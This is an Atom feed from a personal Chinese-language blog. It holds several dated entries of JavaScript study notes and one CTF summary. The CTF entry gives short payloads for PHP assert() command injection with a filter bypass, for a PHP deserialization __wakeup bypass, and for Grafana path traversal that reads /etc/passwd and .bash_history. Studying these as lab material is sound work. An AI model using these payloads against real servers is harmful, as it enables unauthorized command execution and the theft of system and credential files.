<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2022-11-06T14:20:06.450Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>20221106CTF总结</title>
    <link href="https://liu1272.github.io/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2022/11/06/20221106CTF%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-06T13:57:22.000Z</published>
    <updated>2022-11-06T14:20:06.450Z</updated>
    
    <content type="html"><![CDATA[<h5 id="404页面"><a href="#404页面" class="headerlink" title="404页面:"></a>404页面:</h5><p>url+404/</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h5><pre><code>&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];    if($_GET[&#39;c&#39;] === &quot;flag&quot;)&#123;            如果 c=flag 的话，会看到 flag.php 文件        highlight_file(&quot;flag.php&quot;);    &#125;    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;       正则匹配过滤 flag 字符        $page = $_GET[&#39;c&#39;];    &#125;    assert(&quot;file_exists(&#39;$page&#39;)&quot;);           assert 函数&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;利用assert函数的特性，实现命令执行assert函数里面的参数为字符串时，会将字符串当做php命令来执行。assert(&#39;phpinfo()&#39;)=&lt;?php phpinfo()?&gt;构造闭合函数，使 assert 函数执行系统命令为还过滤了 flag 字符，使用?匹配符绕过Payload：?c=1&#39;) or system(&#39;ls?c=1&#39;) or system(&#39;cat fla?.txt</code></pre><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>construct()：构造函数/方法，是类中的一种特殊函数,当使用 new 关键字实例化一个对象时,构造函数将会自动调用<br>wakeup( )函数是在 php 在使用反序列化函数 unserialize()时，会自动调用的函数，只要序列化的中的成员数大于实际成员数，即可绕过<br>destruct()函数是在对象被销毁时才会被调用，可以注意到flag.php文件，需password=666绕过第一个if，username等于usernames才能够输出flag文件；<br>参数需要进行 base64 加密<br>Payload：<br>&lt;?php<br>class Name{<br> private $username = ‘usernames’;<br> private $password = ‘666’;<br>}<br>$select = serialize(new Name());<br>$select = str_replace(‘:2:’,’:3:’,$select);<br>echo base64_encode($select);</p><h5 id="grafana漏洞"><a href="#grafana漏洞" class="headerlink" title="grafana漏洞"></a>grafana漏洞</h5><p>抓包根据漏洞的原理，构造 payload 路径，进行任意文件读取<br>/public/plugins/alertlist/../../../../../../../../../etc/pa<br>sswd<br>看到系统的配置文件，存在哪些用户<br>linux 的历史记录文件.bash_history<br>构造 payload:<br>/public/plugins/alertlist/../../../../../../../../../home/grafana/.bash_history</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;404页面&quot;&gt;&lt;a href=&quot;#404页面&quot; class=&quot;headerlink&quot; title=&quot;404页面:&quot;&gt;&lt;/a&gt;404页面:&lt;/h5&gt;&lt;p&gt;url+404/&lt;/p&gt;
&lt;h5 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>20221105</title>
    <link href="https://liu1272.github.io/2022/11/06/20221105/"/>
    <id>https://liu1272.github.io/2022/11/06/20221105/</id>
    <published>2022-11-06T05:18:00.000Z</published>
    <updated>2022-11-06T09:25:05.087Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="注-本章节较难，请选择性阅读"><a href="#注-本章节较难，请选择性阅读" class="headerlink" title="注:本章节较难，请选择性阅读"></a>注:本章节较难，请选择性阅读</h5><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><p>使用{…}来创建对象。一个属性就是一个键值对（“key: value”），其中键是一个字符串（也叫做属性名），值可以是任何值。</p><pre><code>构造对象方法:let user = new Object();     // “构造函数” 的语法let user = &#123;&#125;;               // “字面量” 的语法读取文件的属性:alert( user.name );          // Johnalert( user.age );           // 30移除属性:delete user.age;             // 移除age这个key方括号:let user = &#123;&#125;;// 设置user[&quot;likes birds&quot;] = true;  // 单引号或双引号都可以// 读取alert(user[&quot;likes birds&quot;]);  // true// 删除delete user[&quot;likes birds&quot;];属性值简写:name, 与 name: name 相同属性名称限制:类型会被自动地转换为字符串但__proto__属性。不能将它设置为一个非对象的值属性存在性测试:alert( user.noSuchProperty === undefined );       // true 意思是没有这个属性alert( &quot;age&quot; in user );                           // true 存在</code></pre><h4 id="for-in-循环"><a href="#for-in-循环" class="headerlink" title="for..in 循环"></a>for..in 循环</h4><pre><code>for (key in object) &#123;  // 对此对象属性中的每个键执行的代码&#125;遍历一个对象时，整数属性会被进行从小到大排序但是 “+49” 和 “1.2” 不行，那它们就按照创建时的顺序来排序</code></pre><h4 id="对象引用和复制"><a href="#对象引用和复制" class="headerlink" title="对象引用和复制"></a>对象引用和复制</h4><p>赋值了对象的变量存储的不是对象本身，而是该对象“在内存中的地址”。</p><h5 id="对象的引用"><a href="#对象的引用" class="headerlink" title="对象的引用:"></a>对象的引用:</h5><pre><code>let user = &#123; name: &#39;John&#39; &#125;;let admin = user;admin.name = &#39;Pete&#39;;               // 通过 &quot;admin&quot; 引用来修改alert(user.name);                  // &#39;Pete&#39;，修改能通过 &quot;user&quot; 引用看到</code></pre><p>仅当两个对象为同一对象时，两者才相等。<br>两个独立的对象则并不相等，即使它们看起来很像（都为空）。</p><h5 id="对象的复制"><a href="#对象的复制" class="headerlink" title="对象的复制"></a>对象的复制</h5><p>通过遍历已有对象的属性，并在原始类型值的层面复制它们，以实现对已有对象结构的复制。</p><pre><code>let user = &#123;  name: &quot;John&quot;,&#125;;let clone = &#123;&#125;;                       // 新的空对象for (let key in user) &#123;               // 将 user 中所有的属性拷贝到其中  clone[key] = user[key];             // 现在 clone 是带有相同内容的完全独立的对象&#125;clone.name = &quot;Pete&quot;;                  // 改变了其中的数据alert( user.name );                   // 原来的对象中的 name 属性依然是 John【也可以使用 Object.assign 方法】Object.assign(dest, [src1, src2, src3...])1.dest 是指目标对象2.src1, ..., srcN是源对象（需传递的参数）3.将所有源对象的属性拷贝到目标对象 dest 中4.调用结果返回 dest5.如果被拷贝的属性的属性名已经存在，那么它会被覆盖</code></pre><h5 id="深层克隆"><a href="#深层克隆" class="headerlink" title="深层克隆"></a>深层克隆</h5><pre><code>let 克隆生成的对象 = Object.assign(&#123;&#125;, 克隆的对象);或者使用“深拷贝”函数，例如 _.cloneDeep(obj)</code></pre><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>1.可达性<br>&emsp;&emsp;如果一个值可以通过引用链从根访问任何其他值，则认为该值是可达的<br>&emsp;&emsp;垃圾回收器会删除掉那些已经不可达的(没有外部对其的引用)<br>2.内部算法(mark-and-sweep):<br>&emsp;&emsp;垃圾收集器遍历所有的根，并“标记”（记住）它们和他们的引用。<br>&emsp;&emsp;没有被标记的对象都会被删除。<br>3.优化建议:<br>&emsp;&emsp;分代收集/增量收集/闲时收集<br>&emsp;&emsp;<a href="https://zh.javascript.info/garbage-collection#zong-jie">进阶了解</a></p><h4 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h4><p>存储在对象属性中的函数被称为“方法”<br>使用函数表达式创建一个函数，并将其指定给对象的属性，随后调用它。就叫做得到了 user 对象的 sayHi 方法。</p><h5 id="this"><a href="#this" class="headerlink" title="this"></a>this</h5><p>访问对象中存储的信息<br>this可以用于任何函数,它取决于代码上下文<br>严格模式下没有对象的情况下调用:this==undefined但尝试访问this.name将会报错<br>this的值是在调用时计算出来的，它的值取决于在“点符号前”的是什么对象。<br>箭头函数没有自己的this。若在箭头函数中引用this，则this值取决于外部“正常的”函数。</p><pre><code>let user = &#123; name: &quot;John&quot; &#125;;let admin = &#123; name: &quot;Admin&quot; &#125;;function sayHi() &#123;  alert( this.name );&#125;// 在两个对象中使用相同的函数user.f = sayHi;admin.f = sayHi;// 这两个调用有不同的 this 值// 函数内部的 &quot;this&quot; 是“点符号前面”的那个对象user.f(); // John（this == user）admin.f(); // Admin（this == admin）admin[&#39;f&#39;](); // Admin（使用点符号或方括号语法来访问这个方法，都没有关系。）</code></pre><h4 id="重点误区，必须记住"><a href="#重点误区，必须记住" class="headerlink" title="重点误区，必须记住"></a><a href="https://zh.javascript.info/object-methods#zai-dui-xiang-zi-mian-liang-zhong-shi-yong-this">重点误区，必须记住</a></h4><h4 id="构造器和操作符-“new”"><a href="#构造器和操作符-“new”" class="headerlink" title="构造器和操作符 “new”"></a>构造器和操作符 “new”</h4><h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><p>命名以大写字母开头。<br>只能由 “new” 操作符来执行</p><pre><code>function User(name) &#123;                1.一个新的空对象被创建并分配给 this。  this.name = name;                  2.函数体执行。通常它会修改 this，为其添加新的属性。  this.isAdmin = false;              3.返回 this 的值。&#125;</code></pre><p>任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器</p><h4 id="new-function-…"><a href="#new-function-…" class="headerlink" title="new function() { … }"></a>new function() { … }</h4><p>如果有许多行用于创建单个复杂对象的代码，可以将它们封装在一个立即调用的构造函数中</p><pre><code>// 创建一个函数并立即使用 new 调用它let user = new function() &#123;  this.name = &quot;John&quot;;  this.isAdmin = false;  // ……用于用户创建的其他代码  // 也许是复杂的逻辑和语句  // 局部变量等&#125;;</code></pre><p>这个构造函数不能被再次调用，因为它不保存在任何地方，只是被创建和调用。<br>因此，这个技巧旨在封装构建单个对象的代码，而无需将来重用。</p><h4 id="构造器模式测试-无需重视"><a href="#构造器模式测试-无需重视" class="headerlink" title="构造器模式测试,无需重视"></a><a href="https://zh.javascript.info/constructor-new#gou-zao-qi-mo-shi-ce-shi-newtarget">构造器模式测试,无需重视</a></h4><h4 id="可选链"><a href="#可选链" class="headerlink" title="可选链"></a>可选链</h4><pre><code>语法有三种形式：obj?.prop —— 如果 obj 存在则返回 obj.prop，否则返回 undefined。obj?.[prop] —— 如果 obj 存在则返回 obj[prop]，否则返回 undefined。obj.method?.() —— 如果 obj.method 存在则调用 obj.method()，否则返回 undefined。总结?. 检查左边部分是否为 null/undefined，如果不是则继续运算。</code></pre><h4 id="symbol-类型"><a href="#symbol-类型" class="headerlink" title="symbol 类型"></a>symbol 类型</h4><p>“symbol” 值表示唯一的标识符。<br>使用 Symbol() 来创建这种类型的值<br>可以给 symbol 一个描述（也称为 symbol 名）          //let id = Symbol(“id”);<br>symbol 保证是唯一的。即使我们创建了许多具有相同描述的 symbol，它们的值也是不同。symbol 不会被自动转换为字符串<br>真的想显示一个 symbol，我们需要</p><pre><code>在它上面调用 .toString()    let id = Symbol(&quot;id&quot;);    alert(id.toString());        //Symbol(id)或者获取 symbol.description 属性，只显示描述    let id = Symbol(&quot;id&quot;);    alert(id.description);       // id</code></pre><p>主要的使用场景：<br>1.“隐藏” 对象属性。<br>    如果我们想要向“属于”另一个脚本或者库的对象添加一个属性，我们可以创建一个 symbol 并使用它作为属性的键。<br>2.JavaScript 使用了许多系统 symbol，这些 symbol 可以作为 Symbol.* 访问。我们可以使用它们来改变一些内建行为。<br>3.symbol 在 for…in 中会被跳过<br>4.Object.keys(user) 也会忽略它们<br>5.相反，Object.assign 会同时复制字符串和 symbol 属性</p><h4 id="对象-——-原始值转换"><a href="#对象-——-原始值转换" class="headerlink" title="对象 —— 原始值转换"></a>对象 —— 原始值转换</h4><p>JavaScript 不允许自定义运算符对对象的处理方式<br>此类运算的情况下，对象会被自动转换为原始值，然后对这些原始值进行运算，并得到运算结果（也是一个原始值）</p><h5 id="转换规则"><a href="#转换规则" class="headerlink" title="转换规则"></a>转换规则</h5><p>1.没有转换为布尔值,所有的对象在布尔上下文（context）中均为 true<br>2.数字转换发生在对象相减或应用数学函数时<br>3.字符串转换通常发生在像 alert(obj) 这样输出一个对象和类似的上下文中</p><h5 id="hint"><a href="#hint" class="headerlink" title="hint"></a>hint</h5><p>“string”（对于 alert 和其他需要字符串的操作）<br>“number”（对于数学运算）<br>“default”（少数运算符，通常对象以和 “number” 相同的方式实现 “default” 转换）</p><h4 id="Symbol-toPrimitive"><a href="#Symbol-toPrimitive" class="headerlink" title="Symbol.toPrimitive"></a>Symbol.toPrimitive</h4><p>用来给转换方法命名</p><h4 id="toString-valueOf"><a href="#toString-valueOf" class="headerlink" title="toString/valueOf"></a>toString/valueOf</h4><p>对于 “string” hint：调用 toString 方法，如果它不存在，则调用 valueOf 方法（因此，对于字符串转换，优先调用 toString）。<br>对于其他 hint：调用 valueOf 方法，如果它不存在，则调用 toString 方法（因此，对于数学运算，优先调用 valueOf 方法）。</p><h4 id="转换可以返回任何原始类型"><a href="#转换可以返回任何原始类型" class="headerlink" title="转换可以返回任何原始类型"></a>转换可以返回任何原始类型</h4><p>它们不一定会返回 “hint” 的原始值<br>唯一强制性的事情是：这些方法必须返回一个原始值，而不是对象。</p><h4 id="进一步的转换"><a href="#进一步的转换" class="headerlink" title="进一步的转换"></a>进一步的转换</h4><p>如果我们将对象作为参数传递，则会出现两个运算阶段：<br>1.对象被转换为原始值（通过前面我们描述的规则）。<br>2.如果还需要进一步计算，则生成的原始值会被进一步转换。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><pre><code>首先调用 obj[Symbol.toPrimitive](hint) 如果这个方法存在，否则，如果 hint 是 &quot;string&quot;        尝试调用 obj.toString() 或 obj.valueOf()，无论哪个存在。否则，如果 hint 是 &quot;number&quot; 或者 &quot;default&quot;        尝试调用 obj.valueOf() 或 obj.toString()，无论哪个存在。在实际使用中，通常只实现 obj.toString() 作为字符串转换的“全能”方法就足够了，该方法应该返回对象的“人类可读”表示，用于日志记录或调试。</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="遇事不决可问春风，春风不语即随本心。"><a href="#遇事不决可问春风，春风不语即随本心。" class="headerlink" title="遇事不决可问春风，春风不语即随本心。"></a>遇事不决可问春风，春风不语即随本心。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;注-本章节较难，请选择性阅读&quot;&gt;&lt;a href=&quot;#注-本章节较难，请选择性阅读&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221104</title>
    <link href="https://liu1272.github.io/2022/11/04/20221104/"/>
    <id>https://liu1272.github.io/2022/11/04/20221104/</id>
    <published>2022-11-04T08:38:00.000Z</published>
    <updated>2022-11-06T09:22:58.280Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><pre><code>let sayHi = function() &#123;  alert( &quot;Hello&quot; );&#125;;function关键字后面没有函数名。函数表达式允许省略函数名注意末尾会有个分号!因为这是以 function(…) &#123;…&#125; 的形式创建的。它不是函数语法的一部分。含义:&quot;创建一个函数并将其放入变量sayHi中&quot;。alert( sayHi );         // 显示函数代码————因为函数是一个值alert( sayHi() );       // 执行函数let func = sayHi;       //将 sayHi 复制到了变量 func</code></pre><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><pre><code>function ask(question, yes, no) &#123;  if (confirm(question)) yes()  else no();&#125;function showOk() &#123;  alert( &quot;You agreed.&quot; );&#125;function showCancel() &#123;  alert( &quot;You canceled the execution.&quot; );&#125;// 用法：函数 showOk 和 showCancel 被作为参数传入到 askask(&quot;Do you agree?&quot;, showOk, showCancel);</code></pre><p>showOk 是回答 “yes” 的回调，showCancel 是回答 “no” 的回调。</p><h5 id="函数表达式-vs-函数声明"><a href="#函数表达式-vs-函数声明" class="headerlink" title="函数表达式 vs 函数声明"></a>函数表达式 vs 函数声明</h5><p>1.语法<br>函数声明：在主代码流中声明为单独的语句的函数<br>函数表达式：在一个表达式中或另一个语法结构中创建的函数。下面这个函数是在赋值表达式 = 右侧创建的<br>2.创建函数时机<br>在函数声明被定义之前，它就可以被调用。<br>函数表达式是在代码执行到达时被创建，并且仅从那一刻起可用。<br>3.块级作用域<br>严格模式下，当一个函数声明在一个代码块内时，它在该代码块内的任何位置都是可见的。但在代码块外不可见。</p><pre><code>let age = 16;              // 拿 16 作为例子if (age &lt; 18) &#123;  welcome();               // \   (运行)  function welcome() &#123;     //  |    alert(&quot;Hello!&quot;);       //  |  函数声明在声明它的代码块内任意位置都可用  &#125;                        //  |  在花括号外部调用函数，我们看不到它们内部的函数声明  welcome();               // /   (运行)&#125; else &#123;  function welcome() &#123;    alert(&quot;Greetings!&quot;);  &#125;&#125;welcome();                 // Error: welcome is not defined【正确写法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome;if (age &lt; 18) &#123;  welcome = function() &#123;    alert(&quot;Hello!&quot;);  &#125;;&#125; else &#123;  welcome = function() &#123;    alert(&quot;Greetings!&quot;);  &#125;;&#125;welcome(); // 现在可以了【改进方法】let age = prompt(&quot;What is your age?&quot;, 18);let welcome = (age &lt; 18) ?  function() &#123; alert(&quot;Hello!&quot;); &#125; :  function() &#123; alert(&quot;Greetings!&quot;); &#125;;welcome(); // 现在可以了</code></pre><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><pre><code>单行箭头函数:let sum = (a, b) =&gt; a + b;/* 这个箭头函数是下面这个函数的更短的版本：let sum = function(a, b) &#123;  return a + b;&#125;;*/alert( sum(1, 2) ); // 3多行箭头函数:let sum = (a, b) =&gt; &#123;  // 花括号表示开始一个多行函数  let result = a + b;  return result;       // 如果我们使用了花括号，那么我们需要一个显式的 “return”&#125;;alert( sum(1, 2) );    // 3从 =&gt; 的左侧获取参数，计算并返回右侧表达式的计算结果用花括号括起来之后，需要包含 return 才能返回值（就像常规函数一样）只有一个参数，还可以省略掉参数外的圆括号没有参数，括号则是空的（但括号必须保留）</code></pre><h4 id="函数总结"><a href="#函数总结" class="headerlink" title="函数总结"></a>函数总结</h4><p>1.函数是值。它们可以在代码的任何地方被分配，复制或声明。<br>2.如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。<br>3.如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。<br>4.在执行代码块之前，内部算法会先处理函数声明(所以函数声明在其被声明的代码块内的任何位置都是可见的)<br>5.函数表达式在执行流程到达时创建。<br>6.首选使用函数声明;仅当函数声明不适合对应的任务时，才应使用函数表达式。</p><h3 id="javascript基础复习"><a href="#javascript基础复习" class="headerlink" title="javascript基础复习"></a>javascript基础复习</h3><p>1.语句用分号分隔<br>2.即使我们在某处添加了「额外的」分号，这也不是错误。分号会被忽略的。<br>3.尽量使用”use strict”<br>4.使用let，const（不变的，不能被改变），var（旧式的，稍后会看到）声明变量<br>5.变量是动态类型的，它们可以存储任何值<br>6.有 8 种数据类型：<br>&nbsp;&nbsp;number — 可以是浮点数，也可以是整数，<br>&nbsp;&nbsp;bigint — 用于任意长度的整数，<br>&nbsp;&nbsp;string — 字符串类型，<br>&nbsp;&nbsp;boolean — 逻辑值：true/false，<br>&nbsp;&nbsp;null — 具有单个值 null 的类型，表示“空”或“不存在”，<br>&nbsp;&nbsp;undefined — 具有单个值 undefined 的类型，表示“未分配（未定义）”，<br>&nbsp;&nbsp;object 和 symbol — 对于复杂的数据结构和唯一标识符，我们目前还没学习这个类型。<br>7.交互:alert、prompt 和 confirm<br>8.二进制加号 + 可以连接字符串。如果任何一个操作数是一个字符串，那么另一个操作数也将被转换为字符串<br>9.三元运算符:cond?resultA:resultB。如果cond为真,则返回resultA,否则返回resultB<br>10.空值合并运算符:a??b的结果是a,除非a为null/undefined,这时结果是b。<br>11.在 for(let…) 循环内部声明的变量只在该循环内可见。但可以省略let并重用已有的变量。<br>12.break/continue允许退出整个循环/当前迭代。使用标签来打破嵌套循环<br>13.switch”结构可以替代多个if检查。它内部使用===进行比较。<br>14.prompt的结果是一个字符串，而不是数字<br>15.函数声明和循环语句后不需要加分号</p><h5 id="其它说明"><a href="#其它说明" class="headerlink" title="其它说明"></a>其它说明</h5><p><a href="https://zh.javascript.info/debugging-chrome">在浏览器中调试</a><br><a href="https://zh.javascript.info/coding-style#tasks">代码风格!!!</a><br><a href="https://zh.javascript.info/comments">注释</a></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>从岐山到长安，高铁只需要一个小时就能抵达，这么一段路，丞相却走了一生。<br>从生至死，人需要经历百年，但有一段岁月，却跟着我走完了一生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;函数表达式&quot;&gt;&lt;a href=&quot;#函数表达式&quot; class=&quot;headerlink&quot; title=&quot;函数表达式&quot;&gt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221103</title>
    <link href="https://liu1272.github.io/2022/11/03/20221103/"/>
    <id>https://liu1272.github.io/2022/11/03/20221103/</id>
    <published>2022-11-02T16:32:00.000Z</published>
    <updated>2022-11-06T09:22:20.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><pre><code>let i = 0;while (i &lt; 3) &#123;           #条件的结果会被转化为布尔值  alert( i );  i++;&#125;</code></pre><p>如果循环体只有一条语句(单循环体)，则可以省略大括号</p><h5 id="do…while循环"><a href="#do…while循环" class="headerlink" title="do…while循环"></a>do…while循环</h5><pre><code>let i = 0;do &#123;  alert( i );  i++;&#125; while (i &lt; 3);</code></pre><p>将条件检查移至循环体下面<br>先执行循环体，然后检查条件，当条件为真时，重复执行循环体</p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><pre><code>for (begin; condition; step) &#123;  循环体&#125;begin进入循环时执行一次condition判断条件body条件为真时，重复运行step每次循环体迭代后执行</code></pre><p>内联变量声明:<br>&emsp;&emsp;函数在执行时，会先在自己的函数体里查询变量，如果没有，才会一级一级往上查找。函数show()在执行时，输出第一个变量a是undefined是因为它现在自己的执行环境里查询到变量a已声明，即变量提升（即变量可以提前声明但是赋值是不可以的），此时就输出了undefined。<br>&emsp;&emsp;因此会出现变量污染现象<br>省略语句段:<br>&emsp;&emsp;不需要做任何事的部分，就可以省略 begin 语句段<br>&emsp;&emsp;注意for的两个;必须存在</p><h5 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue"></a>break与continue</h5><p>一，普通<br>用法与python一样<br>但是，禁止break/continue在‘?’的右边<br>所以，不建议使用?代替if语句<br>二，进阶</p><pre><code>标签(在循环之前带有冒号的标识符)break &lt;labelName&gt; 语句跳出循环至标签labelName:处continue &lt;labelName&gt; 语句执行跳转到标记循环的下一次迭代可以将标签移至单独一行break 指令必须在代码块内continue 只有在循环内部才可行</code></pre><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><pre><code>至少一个 case 代码块和一个可选的 default 代码块switch(x) &#123;  case &#39;value1&#39;:  // if (x === &#39;value1&#39;)    ...    [break]  case &#39;value2&#39;:  // if (x === &#39;value2&#39;)    ...    [break]  default:    ...    [break]&#125;流程:判断条件从成立的开始往下执行直到break，若无break则走到尾(包括default)分组:case 3: // (*) 下面这两个 case 被分在一组，满足一个条件就执行，原理是没有breakcase 5:  alert(&#39;Wrong!&#39;);  alert(&quot;Why don&#39;t you take a math class?&quot;);  break;</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在 JavaScript 中，函数不是“神奇的语言结构”，而是一种特殊的值<br>创建函数的三种方法:函数声明，函数表达式，箭头函数</p><pre><code>function name(parameter1, parameter2, ... parameterN) &#123;  ...body...&#125;name();首先是关键字，然后是函数名，然后是括号之间的参数列表(用逗号分隔)，最后是花括号之间的代码(函数体)parameter是函数参数，下面引用函数时可以使用它作为参数(argument)未提供parameter时，那么相应的值就会变成undefined(默认参数)可以text = &quot;内容&quot;这样子来传参返回值return执行时，函数停止，并将值返回给调用代码，没有返回值会导致函数立即退出并为undefined</code></pre><p>局部变量:<br>在函数中声明的变量只在该函数内部可见</p><p>外部变量:<br>函数也可以访问外部变量<br>函数对外部变量拥有全部的访问权限。函数也可以修改外部变量。<br>函数内部声明了同名变量，那么函数会遮蔽外部变量</p><pre><code>默认参数的计算:在JS中，函数在没带个别参数的情况下被调用，默认参数会被计算出来。如果传递了参数text，那么anotherFunction()就不会被调用。如果没传递参数text，那么anotherFunction()就会被调用。function showMessage(from, text = anotherFunction()) &#123;  // anotherFunction() 仅在没有给定 text 时执行  // 其运行结果将成为 text 的值&#125;也可以这样function showCount(count) &#123;  // 如果 count 为 undefined 或 null，则提示 &quot;unknown&quot;  alert(count ?? &quot;unknown&quot;);&#125;showCount(0); // 0showCount(null); // unknownshowCount();                        // unknown或者这样function showMessage(text) &#123;  // ...  if (text === undefined) &#123;         // 如果参数未被传递进来    text = &#39;empty message&#39;;  &#125;  alert(text);&#125;showMessage();                      // empty message还可以这样function showMessage(text) &#123;  // 如果 text 为 undefined 或者为假值，那么将其赋值为 &#39;empty&#39;  text = text || &#39;empty&#39;;  alert(text);&#125;showMessage();                     // empty</code></pre><p>返回值</p><pre><code>function doNothing() &#123; /* 没有代码 */ &#125;alert( doNothing());函数无返回值，它就会像返回 undefined 一样空值的 return 和 return undefined 等效如果想要将返回的表达式写成跨多行的形式，那么应该在return的同一行开始写此表达式(比如先写个括号)</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>作为参数传递给函数的值，会被复制到函数的局部变量。<br>函数可以访问外部变量。但它只能从内到外起作用。函数外部的代码看不到函数内的局部变量。<br>函数可以返回值。如果没有返回值，则其返回的结果是 undefined。<br>为了使代码简洁易懂，建议在函数中主要使用局部变量和参数，而不是外部变量<br>获取参数、使用参数并返回结果的函数更容易理解。<br>一个好的函数名能够让我们马上知道这个函数的功能是什么，会返回什么。<br>一个单独的函数不仅更容易测试和调试 —— 它的存在本身就是一个很好的注释！</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>一月添香<br>二月夜未央<br>三月情诗慌张<br>四月对镜补红妆<br>五月相携游马十方<br>六月日日笙歌抛流光<br>七月为卿斟唱曲水流觞<br>八月年华辗转处陌上成双<br>九月田中百花争艳怜意满腔<br>十月眠里光阴归去思念倾满江<br>十一月冬雷阵阵我笑悲歌不恸上苍<br>十二月天寒地冻凭楼伫等把痴梦熬荒<br>可叹，人间再无双</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;循环&quot;&gt;&lt;a href=&quot;#循环&quot; class=&quot;headerlink&quot; title=&quot;循环&quot;&gt;&lt;/a&gt;循环&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221102</title>
    <link href="https://liu1272.github.io/2022/11/02/b-16/"/>
    <id>https://liu1272.github.io/2022/11/02/b-16/</id>
    <published>2022-11-02T15:32:04.000Z</published>
    <updated>2022-11-04T09:19:37.511Z</updated>
    
